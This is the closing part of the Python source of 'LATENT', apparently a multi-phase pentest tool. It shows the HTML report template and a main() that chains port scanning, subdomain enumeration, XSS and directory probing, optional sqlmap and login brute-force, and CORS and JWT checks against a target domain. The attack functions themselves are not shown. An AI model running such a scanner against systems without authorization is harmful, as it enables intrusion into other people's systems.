        .finding {{ background: #f8f9fa; padding: 15px; margin: 10px 0; border-left: 4px solid #667eea; border-radius: 4px; }}
        .badge {{ display: inline-block; padding: 3px 10px; border-radius: 12px; color: white; font-size: 0.75em; font-weight: bold; margin-right: 10px; }}
        .screenshot {{ margin: 20px 0; padding: 15px; background: #f8f9fa; border-radius: 4px; }}
        .screenshot h4 {{ margin-bottom: 10px; color: #555; }}
        ul {{ list-style: none; padding-left: 0; }}
        ul li {{ padding: 8px 0; border-bottom: 1px solid #eee; }}
        ul li:before {{ content: "&#9656;"; color: #667eea; margin-right: 10px; }}
        .tech-tags {{ display: flex; flex-wrap: wrap; gap: 8px; margin-top: 10px; }}
        .tag {{ background: #667eea; color: white; padding: 4px 12px; border-radius: 15px; font-size: 0.85em; }}
        footer {{ text-align: center; padding: 20px; color: #666; margin-top: 30px; }}
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>&#127919; LATENT</h1>
            <p>Multi-Phase Web & Network Pentest Report</p>
            <p style="margin-top: 10px; font-size: 0.9em;">Target: <strong>{domain}</strong> | Generated: {timestamp}</p>
        </header>

        <div class="summary">
            <div class="card">
                <h3>{len(data.get('open_ports', []))}</h3>
                <p>Open Ports</p>
            </div>
            <div class="card">
                <h3>{len(data.get('subdomains', []))}</h3>
                <p>Subdomains</p>
            </div>
            <div class="card">
                <h3>{data.get('xss_reflected', 0)}</h3>
                <p>XSS Reflected</p>
            </div>
            <div class="card">
                <h3>{len(data.get('directories', []))}</h3>
                <p>Interesting Paths</p>
            </div>
            <div class="card">
                <h3>{len(data.get('crawled_urls', []))}</h3>
                <p>Crawled URLs</p>
            </div>
            <div class="card">
                <h3>{len(data.get('cors_findings', []))}</h3>
                <p>CORS Issues</p>
            </div>
        </div>

        <div class="section">
            <h2>&#128269; Technology Fingerprinting</h2>
            <pre style="background: #f8f9fa; padding: 15px; border-radius: 4px; overflow-x: auto;">{json.dumps(data.get('technology', {{}}), indent=2)}</pre>
        </div>

        <div class="section">
            <h2>&#127760; Crawled URLs ({len(data.get('crawled_urls', []))})</h2>
            <ul>{crawl_html if crawl_html else "<li>No URLs crawled</li>"}</ul>
        </div>

        <div class="section">
            <h2>&#128225; JavaScript Endpoints ({len(data.get('js_endpoints', []))})</h2>
            <ul>{js_html if js_html else "<li>No endpoints found</li>"}</ul>
        </div>

        <div class="section">
            <h2>&#128275; CORS Misconfiguration Findings ({len(data.get('cors_findings', []))})</h2>
            {cors_html if cors_html else "<p>No CORS issues detected.</p>"}
        </div>

        <div class="section">
            <h2>&#128273; JWT Analysis ({len(data.get('jwt_findings', []))})</h2>
            {jwt_html if jwt_html else "<p>No JWT tokens found or analyzed.</p>"}
        </div>

        <div class="section">
            <h2>&#128248; Screenshots ({len(data.get('screenshots', []))})</h2>
            {screenshots_html if screenshots_html else "<p>No screenshots taken.</p>"}
        </div>

        <div class="section">
            <h2>&#128194; Open Ports</h2>
            <ul>
                {''.join([f"<li>Port {p[0]}/{p[1]}</li>" for p in data.get('open_ports', [])])}
            </ul>
        </div>

        <div class="section">
            <h2>&#128193; Interesting Directories ({len(data.get('directories', []))})</h2>
            <ul>
                {''.join([f"<li>[{d[1]}] {d[0]} ({d[2]} bytes)</li>" for d in data.get('directories', [])])}
            </ul>
        </div>

        <div class="section">
            <h2>&#128100; WHOIS Information</h2>
            <pre style="background: #f8f9fa; padding: 15px; border-radius: 4px; overflow-x: auto;">{json.dumps(data.get('whois', {{}}), indent=2) if data.get('whois') else "No WHOIS data available."}</pre>
        </div>

        <div class="section">
            <h2>&#128272; Brute Force Candidates ({len(data.get('brute_candidates', []))})</h2>
            <ul>
                {''.join([f"<li>{c[1]}:{c[2]} @ {c[0]}</li>" for c in data.get('brute_candidates', [])]) if data.get('brute_candidates') else "<li>No candidates found</li>"}
            </ul>
        </div>

        <footer>
            <p>Generated by LATENT v0.3.0 | Multi-Phase Pentest Tool</p>
            <p style="font-size: 0.8em; margin-top: 5px;">&#9888; For authorized testing only. Unauthorized use is illegal.</p>
        </footer>
    </div>
</body>
</html>"""

    with open(html_path, "w", encoding="utf-8") as f:
        f.write(html_content)

    if logger:
        logger.log(f"HTML report generated: {html_path}", "OK")

    return html_path


def build_report(data, path):
    with open(path, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, default=str)


def main():
    parser = argparse.ArgumentParser(description="LATENT - Multi-Phase Pentest Tool")
    parser.add_argument("-t", "--target", required=True, help="Target domain or URL")
    parser.add_argument("-w", "--wordlist", default="/home/whoami/codesx/subdomains.txt",
                        help="Subdomain/wordlist path")
    parser.add_argument("-p","--ports", type=int, default=1000, help="Max port to scan")
    parser.add_argument("--threads", type=int, default=150, help="Port scan thread count")
    parser.add_argument("--sub-limit", type=int, default=50, help="Subdomain limit (0=all)")
    parser.add_argument("--rate", type=float, default=0.3, help="Inter-request delay in seconds")
    parser.add_argument("--brute", action="store_true", help="Enable login brute-force")
    parser.add_argument("--sqlmap", action="store_true", help="Enable SQLMap integration")
    parser.add_argument("--no-color", action="store_true", help="Disable terminal colors")
    parser.add_argument("--json", action="store_true", help="Emit JSON report alongside TXT")
    parser.add_argument("--html", action="store_true", help="Generate HTML report")
    parser.add_argument("--screenshot", action="store_true", help="Take screenshots with Playwright")
    parser.add_argument("--crawl-depth", type=int, default=2, help="Max crawl depth")
    parser.add_argument("--crawl-pages", type=int, default=50, help="Max pages to crawl")
    args = parser.parse_args()

    if args.no_color:
        import colorama
        colorama.deinit()

    domain = resolve_domain(args.target)
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    report_txt = f"latent_report_{domain}_{ts}.txt"
    report_json = f"latent_report_{domain}_{ts}.json"

    print(f"""
{Fore.CYAN}===============================================================
                     LATENT - IM JUST A ANONYMOUS
                         v0.3.0 | Multi-Phase
===============================================================
{Style.RESET_ALL}""")

    with open(report_txt, "w", encoding="utf-8") as rf:
        logger = Logger(rf)
        session = requests.Session()
        session.headers.update(HEADERS)
        limiter = RateLimiter(args.rate)

        logger.log(f"Target: {domain}")
        logger.log(f"Wordlist: {args.wordlist}")
        logger.log(f"MaxPort: {args.ports} | Threads: {args.threads} | Rate: {args.rate}s")

        html, html_path, tech = fetch_html(domain, logger, session)
        open_ports = scan_ports(domain, args.ports, logger, args.threads)
        smb_data = smb_probe(domain, logger)

        if aiodns:
            found_subs = asyncio.run(subdomain_async(domain, args.wordlist, logger, args.sub_limit))
        else:
            found_subs = subdomain_sync(domain, args.wordlist, logger, args.sub_limit)

        xss_hits = xss_probe(domain, logger, session, limiter)
        dirs = dir_fuzz(domain, logger, session, limiter)
        whois_data = whois_lookup(domain, logger)

        sqlmap_result = False
        if args.sqlmap:
            sqlmap_result = sqlmap_probe(domain, logger)

        brute_results = []
        if args.brute:
            brute_results = brute_login(domain, args.wordlist, logger, session, limiter)

        crawled_urls = recursive_crawl(domain, logger, session, limiter, args.crawl_depth, args.crawl_pages)
        js_endpoints = extract_js_endpoints(domain, logger, session, limiter, crawled_urls)
        cors_findings = cors_check(domain, logger, session, limiter)
        jwt_findings = jwt_analyze(domain, logger, session, limiter)

        screenshots = []
        if args.screenshot:
            screenshots = take_screenshots(domain, logger, crawled_urls)

        summary = {
            "target": domain,
            "timestamp": ts,
            "html_saved": html_path,
            "technology": tech,
            "open_ports": open_ports,
            "smb_shares": smb_data,
            "subdomains": found_subs,
            "xss_reflected": xss_hits,
            "directories": dirs,
            "whois": whois_data,
            "sqlmap_vulnerable": sqlmap_result,
            "brute_candidates": brute_results,
            "crawled_urls": crawled_urls,
            "js_endpoints": js_endpoints,
            "cors_findings": cors_findings,
            "jwt_findings": jwt_findings,
            "screenshots": screenshots
        }

        if args.json:
            build_report(summary, report_json)
            logger.log(f"JSON report: {report_json}", "OK")

        if args.html:
            html_report_path = generate_html_report(summary, domain, ts, logger=logger)
            logger.log(f"HTML report: {html_report_path}", "OK")

        logger.phase("SUMMARY")
        logger.log(f"Open Ports: {len(open_ports)}")
        logger.log(f"Subdomains: {len(found_subs)}")
        logger.log(f"XSS Reflected: {xss_hits}")
        logger.log(f"Interesting Paths: {len(dirs)}")
        logger.log(f"Crawled URLs: {len(crawled_urls)}")
        logger.log(f"JS Endpoints: {len(js_endpoints)}")
        logger.log(f"CORS Issues: {len(cors_findings)}")
        logger.log(f"JWT Findings: {len(jwt_findings)}")
        logger.log(f"Screenshots: {len(screenshots)}")
        logger.log(f"Brute Candidates: {len(brute_results)}")
        logger.log(f"TXT Report: {report_txt}", "OK")

    print(f"\n{Fore.GREEN}[*] Done. Report: {report_txt}{Style.RESET_ALL}")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Interrupted by user.{Style.RESET_ALL}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Fore.RED}[!] Fatal: {e}{Style.RESET_ALL}")
        sys.exit(1)
